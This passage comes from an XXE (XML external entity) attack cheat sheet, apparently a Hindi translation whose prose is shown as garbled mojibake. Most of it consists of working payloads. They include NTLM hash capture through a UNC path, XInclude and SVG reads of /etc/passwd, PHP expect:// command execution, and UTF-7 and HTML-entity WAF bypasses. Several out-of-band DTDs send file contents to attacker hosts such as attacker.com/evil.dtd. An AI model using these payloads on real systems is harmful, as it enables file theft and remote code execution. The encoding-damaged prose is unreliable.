Windows рд╣реЛрд╕реНрдЯ рдкрд░ рд╡реЗрдм рд╕рд░реНрд╡рд░ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХрд╛ NTML рд╣реИрд╢ рдкреНрд░рд╛рдкреНрдд рдХрд░рдирд╛ рд╕рдВрднрд╡ рд╣реИ рдПрдХ responder.py рд╣реИрдВрдбрд▓рд░ рд╕реЗрдЯ рдХрд░рдХреЗ:
```bash
Responder.py -I eth0 -v
```
рдФрд░ рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдЕрдиреБрд░реЛрдз рднреЗрдЬрдХрд░
```xml
<!--?xml version="1.0" ?-->
<!DOCTYPE foo [<!ENTITY example SYSTEM 'file://///attackerIp//randomDir/random.jpg'> ]>
<data>&example;</data>
```
## рдЫрд┐рдкреА рд╣реБрдИ XXE рд╕рддрд╣реЗрдВ

### XInclude

рдЬрдм рдХреНрд▓рд╛рдЗрдВрдЯ рдбреЗрдЯрд╛ рдХреЛ рд╕рд░реНрд╡рд░-рд╕рд╛рдЗрдб XML рджрд╕реНрддрд╛рд╡реЗрдЬреЛрдВ рдореЗрдВ рдПрдХреАрдХреГрдд рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рдЬреИрд╕реЗ рдХрд┐ рдмреИрдХрдПрдВрдб SOAP рдЕрдиреБрд░реЛрдзреЛрдВ рдореЗрдВ, XML рд╕рдВрд░рдЪрдирд╛ рдкрд░ рд╕реАрдзрд╛ рдирд┐рдпрдВрддреНрд░рдг рдЕрдХреНрд╕рд░ рд╕реАрдорд┐рдд рд╣реЛрддрд╛ рд╣реИ, `DOCTYPE` рддрддреНрд╡ рдХреЛ рд╕рдВрд╢реЛрдзрд┐рдд рдХрд░рдиреЗ рдкрд░ рдкреНрд░рддрд┐рдмрдВрдз рд▓рдЧрдиреЗ рдХреЗ рдХрд╛рд░рдг, рдкрд╛рд░рдВрдкрд░рд┐рдХ XXE рд╣рдорд▓реЛрдВ рдХреЛ рдмрд╛рдзрд┐рдд рдХрд░рддрд╛ рд╣реИред рд╣рд╛рд▓рд╛рдВрдХрд┐, `XInclude` рд╣рдорд▓рд╛ рдПрдХ рд╕рдорд╛рдзрд╛рди рдкреНрд░рджрд╛рди рдХрд░рддрд╛ рд╣реИ рдЬрд┐рд╕рдХреЗ рджреНрд╡рд╛рд░рд╛ XML рджрд╕реНрддрд╛рд╡реЗрдЬ рдХреЗ рдХрд┐рд╕реА рднреА рдбреЗрдЯрд╛ рддрддреНрд╡ рдореЗрдВ рдмрд╛рд╣реНрдп рдПрдВрдЯрд┐рдЯрд┐рдпреЛрдВ рдХреЛ рдбрд╛рд▓рд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред рдпрд╣ рд╡рд┐рдзрд┐ рдЙрд╕ рд╕рдордп рдкреНрд░рднрд╛рд╡реА рд╣реИ рдЬрдм рдХреЗрд╡рд▓ рд╕рд░реНрд╡рд░ рджреНрд╡рд╛рд░рд╛ рдЙрддреНрдкрдиреНрди XML рджрд╕реНрддрд╛рд╡реЗрдЬ рдХреЗ рдбреЗрдЯрд╛ рдХрд╛ рдХреЗрд╡рд▓ рдПрдХ рд╣рд┐рд╕реНрд╕рд╛ рдирд┐рдпрдВрддреНрд░рд┐рдд рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред

`XInclude` рд╣рдорд▓рд╛ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП, `XInclude` рдиреЗрдорд╕реНрдкреЗрд╕ рдХреЛ рдШреЛрд╖рд┐рдд рдХрд┐рдпрд╛ рдЬрд╛рдирд╛ рдЪрд╛рд╣рд┐рдП, рдФрд░ рдЗрдЪреНрдЫрд┐рдд рдмрд╛рд╣реНрдп рдПрдВрдЯрд┐рдЯреА рдХреЗ рд▓рд┐рдП рдлрд╝рд╛рдЗрд▓ рдкрде рдХреЛ рдирд┐рд░реНрджрд┐рд╖реНрдЯ рдХрд┐рдпрд╛ рдЬрд╛рдирд╛ рдЪрд╛рд╣рд┐рдПред рдиреАрдЪреЗ рдПрдХ рд╕рдВрдХреНрд╖рд┐рдкреНрдд рдЙрджрд╛рд╣рд░рдг рджрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ рдХрд┐ рдЗрд╕ рдкреНрд░рдХрд╛рд░ рдХрд╛ рд╣рдорд▓рд╛ рдХреИрд╕реЗ рддреИрдпрд╛рд░ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ:
```xml
productId=<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>&storeId=1
```
рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА рдХреЗ рд▓рд┐рдП [https://portswigger.net/web-security/xxe](https://portswigger.net/web-security/xxe) рдкрд░ рдЬрд╛рдВрдЪ рдХрд░реЗрдВ!

### SVG - рдлрд╝рд╛рдЗрд▓ рдЕрдкрд▓реЛрдб

рдЙрди рдлрд╝рд╛рдЗрд▓реЛрдВ рдХреЛ рдЬреЛ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рджреНрд╡рд╛рд░рд╛ рдХрд┐рд╕реА рдРрдкреНрд▓рд┐рдХреЗрд╢рди рдкрд░ рдЕрдкрд▓реЛрдб рдХреА рдЬрд╛рддреА рд╣реИрдВ, рдЬреЛ рдлрд┐рд░ рд╕рд░реНрд╡рд░ рдкрд░ рдкреНрд░реЛрд╕реЗрд╕ рдХреА рдЬрд╛рддреА рд╣реИрдВ, рдореЗрдВ XML рдпрд╛ XML-рд╕рдВрдмрдВрдзрд┐рдд рдлрд╝рд╛рдЗрд▓ рдкреНрд░рд╛рд░реВрдкреЛрдВ рдХреЛ рдХреИрд╕реЗ рд╣реИрдВрдбрд▓ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рдореЗрдВ рдЧрдбрд╝рдмрдбрд╝реА рдХрд╛ рд╢рд┐рдХрд╛рд░ рд╣реЛ рд╕рдХрддреА рд╣реИред рдСрдлрд┐рд╕ рджрд╕реНрддрд╛рд╡реЗрдЬрд╝ (DOCX) рдФрд░ рдЫрд╡рд┐рдпреЛрдВ (SVG) рдЬреИрд╕реЗ рд╕рд╛рдорд╛рдиреНрдп рдлрд╝рд╛рдЗрд▓ рдкреНрд░рд╛рд░реВрдк XML рдкрд░ рдЖрдзрд╛рд░рд┐рдд рд╣реЛрддреЗ рд╣реИрдВред

рдЬрдм рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдПрдВ **рдЫрд╡рд┐рдпрд╛рдБ рдЕрдкрд▓реЛрдб** рдХрд░рддреЗ рд╣реИрдВ, рддреЛ рдпреЗ рдЫрд╡рд┐рдпрд╛рдБ рд╕рд░реНрд╡рд░-рд╕рд╛рдЗрдб рдкреНрд░реЛрд╕реЗрд╕ рдпрд╛ рд╕рддреНрдпрд╛рдкрд┐рдд рдХреА рдЬрд╛рддреА рд╣реИрдВред рдРрд╕реЗ рднреА рдРрдкреНрд▓рд┐рдХреЗрд╢рдиреНрд╕ рдХреЗ рд▓рд┐рдП рдЬреЛ PNG рдпрд╛ JPEG рдЬреИрд╕реЗ рдкреНрд░рд╛рд░реВрдкреЛрдВ рдХреА рдЙрдореНрдореАрдж рдХрд░ рд░рд╣реЗ рд╣реЛрдВ, **рд╕рд░реНрд╡рд░ рдХреА рдЫрд╡рд┐ рдкреНрд░реЛрд╕реЗрд╕рд┐рдВрдЧ рдкреБрд╕реНрддрдХрд╛рд▓рдп рднреА SVG рдЫрд╡рд┐рдпреЛрдВ рдХрд╛ рд╕рдорд░реНрдерди рдХрд░ рд╕рдХрддреА рд╣реИ**ред SVG, рдЬреЛ рдПрдХ XML-рдЖрдзрд╛рд░рд┐рдд рдкреНрд░рд╛рд░реВрдк рд╣реИ, рд╣рдорд▓рд╛рд╡рд╛рджрд┐рдпреЛрдВ рджреНрд╡рд╛рд░рд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ рддрд╛рдХрд┐ рд╡реЗ рджреБрд░реБрдкрдпреЛрдЧреА SVG рдЫрд╡рд┐рдпрд╛рдБ рд╕рдмрдорд┐рдЯ рдХрд░ рд╕рдХреЗрдВ, рдЬрд┐рд╕рд╕реЗ рд╕рд░реНрд╡рд░ рдХреЛ XXE (XML External Entity) рд╡рдВрд╢рд╛рдВрдХрди рдХреА рдЦреБрд▓реА рд╣реЛ рд╕рдХрддреА рд╣реИред

рдЗрд╕ рддрд░рд╣ рдХреЗ рдПрдХ рджреБрд░реБрдкрдпреЛрдЧ рдХрд╛ рдЙрджрд╛рд╣рд░рдг рдиреАрдЪреЗ рджрд┐рдЦрд╛рдпрд╛ рдЧрдпрд╛ рд╣реИ, рдЬрд╣рд╛рдБ рдПрдХ рджреБрд░реБрдкрдпреЛрдЧреА SVG рдЫрд╡рд┐ рд╕рд┐рд╕реНрдЯрдо рдлрд╝рд╛рдЗрд▓реЗрдВ рдкрдврд╝рдиреЗ рдХрд╛ рдкреНрд░рдпрд╛рд╕ рдХрд░рддреА рд╣реИ:
```xml
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="300" version="1.1" height="200"><image xlink:href="file:///etc/hostname"></image></svg>
```
рдПрдХ рдФрд░ рддрдХрдиреАрдХ рд╢рд╛рдорд┐рд▓ рд╣реИ рдЬрд┐рд╕рдореЗрдВ PHP "expect" рд╡реНрд░реИрдкрд░ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ **рдХрдорд╛рдВрдбреНрд╕ рдХреЛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд** рдХрд░рдиреЗ рдХрд╛ рдкреНрд░рдпрд╛рд╕ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ:
```xml
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="300" version="1.1" height="200">
<image xlink:href="expect://ls"></image>
</svg>
```
рджреЛрдиреЛрдВ рдорд╛рдорд▓реЛрдВ рдореЗрдВ, SVG рдкреНрд░рд╛рд░реВрдк рдХрд╛ рдЙрдкрдпреЛрдЧ рд╕рд░реНрд╡рд░ рдХреЗ рд╕реЙрдлрд╝реНрдЯрд╡реЗрдпрд░ рдХреА XML рдкреНрд░реЛрд╕реЗрд╕рд┐рдВрдЧ рдХреНрд╖рдорддрд╛рдУрдВ рдХрд╛ рд╢реЛрд╖рдг рдХрд░рдиреЗ рд╡рд╛рд▓реЗ рд╣рдорд▓реЛрдВ рдХреЛ рд▓реЙрдиреНрдЪ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рдЬрд┐рд╕рд╕реЗ рдордЬрдмреВрдд рдЗрдирдкреБрдЯ рдорд╛рдиреНрдпрддрд╛ рдФрд░ рд╕реБрд░рдХреНрд╖рд╛ рдЙрдкрд╛рдп рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рдХреЛ рд╣рд╛рдЗрд▓рд╛рдЗрдЯ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред

рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА рдХреЗ рд▓рд┐рдП [https://portswigger.net/web-security/xxe](https://portswigger.net/web-security/xxe) рджреЗрдЦреЗрдВ!

**рдПрдХ PDF рдлрд╝рд╛рдЗрд▓ рдЕрдкрд▓реЛрдб рдХрд░рдиреЗ**

рдПрдХ XXE рдХреЛ рд╢реЛрд╖рд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдПрдХ PDF рдлрд╝рд╛рдЗрд▓ рдЕрдкрд▓реЛрдб рдХрд░рдиреЗ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХреИрд╕реЗ рдХрд░реЗрдВ рдЗрд╕реЗ рд╕реАрдЦрдиреЗ рдХреЗ рд▓рд┐рдП рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдкреЛрд╕реНрдЯ рдкрдврд╝реЗрдВ:

{% content-ref url="file-upload/pdf-upload-xxe-and-cors-bypass.md" %}
[pdf-upload-xxe-and-cors-bypass.md](file-upload/pdf-upload-xxe-and-cors-bypass.md)
{% endcontent-ref %}

### Content-Type: x-www-urlencoded рд╕реЗ XML рддрдХ

рдпрджрд┐ рдПрдХ POST рдЕрдиреБрд░реЛрдз XML рдкреНрд░рд╛рд░реВрдк рдореЗрдВ рдбреЗрдЯрд╛ рд╕реНрд╡реАрдХрд╛рд░ рдХрд░рддрд╛ рд╣реИ, рддреЛ рдЖрдк рдЙрд╕ рдЕрдиреБрд░реЛрдз рдореЗрдВ рдПрдХ XXE рдХрд╛ рд╢реЛрд╖рдг рдХрд░рдиреЗ рдХреА рдХреЛрд╢рд┐рд╢ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП, рдпрджрд┐ рдПрдХ рд╕рд╛рдорд╛рдиреНрдп рдЕрдиреБрд░реЛрдз рдореЗрдВ рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рд╢рд╛рдорд┐рд▓ рд╣реИ:
```xml
POST /action HTTP/1.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 7

foo=bar
```
рдлрд┐рд░ рдЖрдк рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдЕрдиреБрд░реЛрдз рдХреЛ рд╕рдмрдорд┐рдЯ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ, рдЬрд┐рд╕рд╕реЗ рдПрдХ рд╣реА рдкрд░рд┐рдгрд╛рдо рдорд┐рд▓реЗрдЧрд╛:
```xml
POST /action HTTP/1.0
Content-Type: text/xml
Content-Length: 52

<?xml version="1.0" encoding="UTF-8"?><foo>bar</foo>
```
### Content-Type: JSON рд╕реЗ XEE рддрдХ

рдЕрдиреБрд░реЛрдз рдХреЛ рдмрджрд▓рдиреЗ рдХреЗ рд▓рд┐рдП рдЖрдк рдПрдХ рдмрд░реНрдк рдПрдХреНрд╕рдЯреЗрдВрд╢рди рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдЬрд┐рд╕рдХрд╛ рдирд╛рдо рд╣реИ "**Content Type Converter**". [рдпрд╣рд╛рдБ](https://exploitstube.com/xxe-for-fun-and-profit-converting-json-request-to-xml.html) рдЖрдк рдЗрд╕ рдЙрджрд╛рд╣рд░рдг рдХреЛ рдкрд╛ рд╕рдХрддреЗ рд╣реИрдВ:
```xml
Content-Type: application/json;charset=UTF-8

{"root": {"root": {
"firstName": "Avinash",
"lastName": "",
"country": "United States",
"city": "ddd",
"postalCode": "ddd"
}}}
```

```xml
Content-Type: application/xml;charset=UTF-8

<?xml version="1.0" encoding="UTF-8" standalone="no"?>
<!DOCTYPE testingxxe [<!ENTITY xxe SYSTEM "http://34.229.92.127:8000/TEST.ext" >]>
<root>
<root>
<firstName>&xxe;</firstName>
<lastName/>
<country>United States</country>
<city>ddd</city>
<postalCode>ddd</postalCode>
</root>
</root>
```
рдПрдХ рдФрд░ рдЙрджрд╛рд╣рд░рдг [рдпрд╣рд╛рдБ](https://medium.com/hmif-itb/googlectf-2019-web-bnv-writeup-nicholas-rianto-putra-medium-b8e2d86d78b2) рдорд┐рд▓ рд╕рдХрддрд╛ рд╣реИред

## WAF рдФрд░ рд╕реБрд░рдХреНрд╖рд╛ рдЙрд▓рдЯрд╛рд╡

### Base64
```xml
<!DOCTYPE test [ <!ENTITY % init SYSTEM "data://text/plain;base64,ZmlsZTovLy9ldGMvcGFzc3dk"> %init; ]><foo/>
```
### UTF-7

рдпрд╣ рдХреЗрд╡рд▓ рддрдм рдХрд╛рдо рдХрд░реЗрдЧрд╛ рдЕрдЧрд░ XML рд╕рд░реНрд╡рд░ `data://` рдкреНрд░реЛрдЯреЛрдХреЙрд▓ рд╕реНрд╡реАрдХрд╛рд░ рдХрд░рддрд╛ рд╣реИред

рдЖрдк рдпрд╣рд╛рдБ \[**"Encode Recipe**" of cyberchef here ]\(\[[https://gchq.github.io/CyberChef/#recipe=Encode\_text%28'UTF-7](https://gchq.github.io/CyberChef/#recipe=Encode\_text%28'UTF-7) %2865000%29'%29\&input=PCFET0NUWVBFIGZvbyBbPCFFTlRJVFkgZXhhbXBsZSBTWVNURU0gIi9ldGMvcGFzc3dkIj4gXT4KPHN0b2NrQ2hlY2s%2BPHByb2R1Y3RJZD4mZXhhbXBsZTs8L3Byb2R1Y3RJZD48c3RvcmVJZD4xPC9zdG9yZUlkPjwvc3RvY2tDaGVjaz4)to]\([https://gchq.github.io/CyberChef/#recipe=Encode\_text%28'UTF-7 %2865000%29'%29\&input=PCFET0NUWVBFIGZvbyBbPCFFTlRJVFkgZXhhbXBsZSBTWVNURU0gIi9ldGMvcGFzc3dkIj4gXT4KPHN0b2NrQ2hlY2s%2BPHByb2R1Y3RJZD4mZXhhbXBsZTs8L3Byb2R1Y3RJZD48c3RvcmVJZD4xPC9zdG9yZUlkPjwvc3RvY2tDaGVjaz4%29to](https://gchq.github.io/CyberChef/#recipe=Encode\_text%28%27UTF-7%20%2865000%29%27%29\&input=PCFET0NUWVBFIGZvbyBbPCFFTlRJVFkgZXhhbXBsZSBTWVNURU0gIi9ldGMvcGFzc3dkIj4gXT4KPHN0b2NrQ2hlY2s%2BPHByb2R1Y3RJZD4mZXhhbXBsZTs8L3Byb2R1Y3RJZD48c3RvcmVJZD4xPC9zdG9yZUlkPjwvc3RvY2tDaGVjaz4%29to)) UTF-7 рдореЗрдВ рдмрджрд▓ рд╕рдХрддреЗ рд╣реИрдВред
```xml
<!xml version="1.0" encoding="UTF-7"?-->
+ADw-+ACE-DOCTYPE+ACA-foo+ACA-+AFs-+ADw-+ACE-ENTITY+ACA-example+ACA-SYSTEM+ACA-+ACI-/etc/passwd+ACI-+AD4-+ACA-+AF0-+AD4-+AAo-+ADw-stockCheck+AD4-+ADw-productId+AD4-+ACY-example+ADs-+ADw-/productId+AD4-+ADw-storeId+AD4-1+ADw-/storeId+AD4-+ADw-/stockCheck+AD4-
```

```xml
<?xml version="1.0" encoding="UTF-7"?>
+ADwAIQ-DOCTYPE foo+AFs +ADwAIQ-ELEMENT foo ANY +AD4
+ADwAIQ-ENTITY xxe SYSTEM +ACI-http://hack-r.be:1337+ACI +AD4AXQA+
+ADw-foo+AD4AJg-xxe+ADsAPA-/foo+AD4
```
### рдлрд╝рд╛рдЗрд▓:/ рдкреНрд░реЛрдЯреЛрдХреЙрд▓ рдмрд╛рдИрдкрд╛рд╕

рдЕрдЧрд░ рд╡реЗрдм PHP рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд░рд╣рд╛ рд╣реИ, рддреЛ `file:/` рдХреА рдмрдЬрд╛рдп рдЖрдк **php wrappers**`php://filter/convert.base64-encode/resource=` рдХрд╛ рдЙрдкрдпреЛрдЧ **рдЖрдВрддрд░рд┐рдХ рдлрд╝рд╛рдЗрд▓реЛрдВ рддрдХ рдкрд╣реБрдБрдЪрдиреЗ** рдХреЗ рд▓рд┐рдП рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред

рдЕрдЧрд░ рд╡реЗрдм Java рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд░рд╣рд╛ рд╣реИ рддреЛ рдЖрдк [**jar: рдкреНрд░реЛрдЯреЛрдХреЙрд▓**](xxe-xee-xml-external-entity.md#jar-protocol) рдХреА рдЬрд╛рдБрдЪ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред

### HTML Entities

[**https://github.com/Ambrotd/XXE-Notes**](https://github.com/Ambrotd/XXE-Notes) рд╕реЗ рдЯреНрд░рд┐рдХ\
рдЖрдк рдПрдХ **рдПрдВрдЯрд┐рдЯреА рдХреЛ рдПрдВрдЯрд┐рдЯреА рдХреЗ рдЕрдВрджрд░ рдмрдирд╛ рд╕рдХрддреЗ** рд╣реИрдВ рдЬрд┐рд╕реЗ **html entities** рд╕реЗ рдПрдиреНрдХреЛрдб рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ рдФрд░ рдлрд┐рд░ рдЗрд╕реЗ **рдПрдХ dtd рд▓реЛрдб рдХрд░рдиреЗ** рдХреЗ рд▓рд┐рдП рдХреЙрд▓ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред\
рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ рдЙрдкрдпреЛрдЧ рдХрд┐рдП рдЬрд╛рдиреЗ рд╡рд╛рд▓реЗ **HTML Entities** рдХреЛ **рд╕рдВрдЦреНрдпрд╛рддреНрдордХ** рд╣реЛрдирд╛ рдЪрд╛рд╣рд┐рдП (рдЬреИрд╕реЗ \[рдЗрд╕ рдЙрджрд╛рд╣рд░рдг рдореЗрдВ]\([https://gchq.github.io/CyberChef/#recipe=To\_HTML\_Entity%28true,'Numeric entities'%29\&input=PCFFTlRJVFkgJSBkdGQgU1lTVEVNICJodHRwOi8vMTcyLjE3LjAuMTo3ODc4L2J5cGFzczIuZHRkIiA%2B)\\](https://gchq.github.io/CyberChef/#recipe=To\_HTML\_Entity%28true,%27Numeric%20entities%27%29\&input=PCFFTlRJVFkgJSBkdGQgU1lTVEVNICJodHRwOi8vMTcyLjE3LjAuMTo3ODc4L2J5cGFzczIuZHRkIiA%2B\)%5C)).
```xml
<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY % a "&#x3C;&#x21;&#x45;&#x4E;&#x54;&#x49;&#x54;&#x59;&#x25;&#x64;&#x74;&#x64;&#x53;&#x59;&#x53;&#x54;&#x45;&#x4D;&#x22;&#x68;&#x74;&#x74;&#x70;&#x3A;&#x2F;&#x2F;&#x6F;&#x75;&#x72;&#x73;&#x65;&#x72;&#x76;&#x65;&#x72;&#x2E;&#x63;&#x6F;&#x6D;&#x2F;&#x62;&#x79;&#x70;&#x61;&#x73;&#x73;&#x2E;&#x64;&#x74;&#x64;&#x22;&#x3E;" >%a;%dtd;]>
<data>
<env>&exfil;</env>
</data>
```
DTD рдЙрджрд╛рд╣рд░рдг:
```xml
<!ENTITY % data SYSTEM "php://filter/convert.base64-encode/resource=/flag">
<!ENTITY % abt "<!ENTITY exfil SYSTEM 'http://172.17.0.1:7878/bypass.xml?%data;'>">
%abt;
%exfil;
```
## PHP рд░реИрдкрд░реНрд╕

### Base64

**рдирд┐рдХрд╛рд▓реЗрдВ** _**index.php**_
```xml
<!DOCTYPE replace [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php"> ]>
```
#### **рдмрд╛рд╣реНрдп рд╕рдВрд╕рд╛рдзрди рдирд┐рдХрд╛рд▓реЗрдВ**
```xml
<!DOCTYPE replace [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=http://10.0.0.3"> ]>
```
### рд░рд┐рдореЛрдЯ рдХреЛрдб рдирд┐рд╖реНрдкрд╛рджрди

**рдпрджрд┐ PHP "expect" рдореЙрдбреНрдпреВрд▓ рд▓реЛрдб рд╣реИ**
```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [ <!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM "expect://id" >]>
<creds>
<user>&xxe;</user>
<pass>mypass</pass>
</creds>
```
## **SOAP - XEE**
```xml
<soap:Body><foo><![CDATA[<!DOCTYPE doc [<!ENTITY % dtd SYSTEM "http://x.x.x.x:22/"> %dtd;]><xxx/>]]></foo></soap:Body>
```
## XLIFF - XXE

рдпрд╣ рдЙрджрд╛рд╣рд░рдг [https://pwn.vg/articles/2021-06/local-file-read-via-error-based-xxe](https://pwn.vg/articles/2021-06/local-file-read-via-error-based-xxe) рд╕реЗ рдкреНрд░реЗрд░рд┐рдд рд╣реИред

XLIFF (XML рд╕реНрдерд╛рдиреАрдпрдХрд░рдг рдЕрдВрддрд░рд╛рд▓ рдлрд╝рд╛рдЗрд▓ рдкреНрд░рд╛рд░реВрдк) рдХрд╛ рдЙрдкрдпреЛрдЧ рд╕реНрдерд╛рдиреАрдпрдХрд░рдг рдкреНрд░рдХреНрд░рд┐рдпрд╛рдУрдВ рдореЗрдВ рдбреЗрдЯрд╛ рд╡рд┐рдирд┐рдордп рдХреЛ рдорд╛рдирдХреАрдХреГрдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред рдпрд╣ рдПрдХ XML-рдЖрдзрд╛рд░рд┐рдд рдкреНрд░рд╛рд░реВрдк рд╣реИ рдЬрд┐рд╕рдХрд╛ рдкреНрд░рд╛рдердорд┐рдХ рдЙрдкрдпреЛрдЧ рд╕реНрдерд╛рдиреАрдпрдХрд░рдг рдХреЗ рджреМрд░рд╛рди рдЯреВрд▓реНрд╕ рдХреЗ рдмреАрдЪ рд╕реНрдерд╛рдиреАрдпрдХрд░рдгреАрдп рдбреЗрдЯрд╛ рдХреЛ рд╕реНрдерд╛рдирд╛рдВрддрд░рд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдФрд░ CAT (рдХрдВрдкреНрдпреВрдЯрд░ рд╕рд╣рд╛рдпрд┐рддрд╛ рдЕрдиреБрд╡рд╛рдж) рдЙрдкрдХрд░рдгреЛрдВ рдХреЗ рд▓рд┐рдП рдПрдХ рд╕рд╛рдорд╛рдиреНрдп рд╡рд┐рдирд┐рдордп рдкреНрд░рд╛рд░реВрдк рдХреЗ рд░реВрдк рдореЗрдВ рдкреНрд░рдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред

### рдЕрдВрдзрд╛ рдЕрдиреБрд░реЛрдз рд╡рд┐рд╢реНрд▓реЗрд╖рдг

рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рд╕рд╛рдордЧреНрд░реА рдХреЗ рд╕рд╛рде рд╕рд░реНрд╡рд░ рдХреЛ рдПрдХ рдЕрдиреБрд░реЛрдз рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ:
```xml
------WebKitFormBoundaryqBdAsEtYaBjTArl3
Content-Disposition: form-data; name="file"; filename="xxe.xliff"
Content-Type: application/x-xliff+xml

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE XXE [
<!ENTITY % remote SYSTEM "http://redacted.burpcollaborator.net/?xxe_test"> %remote; ]>
<xliff srcLang="en" trgLang="ms-MY" version="2.0"></xliff>
------WebKitFormBoundaryqBdAsEtYaBjTArl3--
```
рд╣рд╛рд▓рд╛рдВрдХрд┐, рдпрд╣ рдЕрдиреБрд░реЛрдз рдПрдХ рдЖрдВрддрд░рд┐рдХ рд╕рд░реНрд╡рд░ рддреНрд░реБрдЯрд┐ рдХреЛ рдЯреНрд░рд┐рдЧрд░ рдХрд░рддрд╛ рд╣реИ, рд╡рд┐рд╢реЗрд╖ рд░реВрдк рд╕реЗ рдорд╛рд░реНрдХрдЕрдк рдШреЛрд╖рдгрд╛рдУрдВ рдХреЗ рд╕рд╛рде рд╕рдорд╕реНрдпрд╛ рдХрд╛ рдЙрд▓реНрд▓реЗрдЦ рдХрд░рддрд╛ рд╣реИ:
```json
{"status":500,"error":"Internal Server Error","message":"Error systemId: http://redacted.burpcollaborator.net/?xxe_test; The markup declarations contained or pointed to by the document type declaration must be well-formed."}
```
рдЧрд▓рддреА рдХреЗ рдмрд╛рд╡рдЬреВрдж, Burp Collaborator рдкрд░ рдПрдХ рд╣рд┐рдЯ рджрд░реНрдЬ рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ, рдЬрд┐рд╕рд╕реЗ рдмрд╛рд╣рд░реА рдПрдВрдЯрд┐рдЯреА рдХреЗ рд╕рд╛рде рдХрд┐рд╕реА рд╕реНрддрд░ рдХреЗ рдмрд╛рддрдЪреАрдд рдХрд╛ рдкрддрд╛ рдЪрд▓рддрд╛ рд╣реИред

рдЖрдЙрдЯ рдСрдлрд╝ рдмреИрдВрдб рдбреЗрдЯрд╛ рдирд┐рдХрд╛рд╕реА
рдбреЗрдЯрд╛ рдирд┐рдХрд╛рд▓рдиреЗ рдХреЗ рд▓рд┐рдП, рдПрдХ рд╕рдВрд╢реЛрдзрд┐рдд рдЕрдиреБрд░реЛрдз рднреЗрдЬрд╛ рдЬрд╛рддрд╛ рд╣реИ:
```
------WebKitFormBoundaryqBdAsEtYaBjTArl3
Content-Disposition: form-data; name="file"; filename="xxe.xliff"
Content-Type: application/x-xliff+xml

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE XXE [
<!ENTITY % remote SYSTEM "http://attacker.com/evil.dtd"> %remote; ]>
<xliff srcLang="en" trgLang="ms-MY" version="2.0"></xliff>
------WebKitFormBoundaryqBdAsEtYaBjTArl3--
```
